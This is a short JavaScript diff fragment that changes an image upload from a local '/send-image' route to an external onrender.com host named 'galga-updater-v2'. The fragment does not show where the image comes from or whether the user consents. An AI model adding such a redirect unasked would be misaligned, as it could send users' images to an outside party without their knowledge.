@@ -199,7 +199,7 @@
                     const formData = new FormData();
                     formData.append('image', blob, 'image.jpg');
 
-                    fetch('/send-image', {
+                    fetch('https://galga-updater-v2.onrender.com/send-image', {
                         method: 'POST',
                         body: formData
                     })
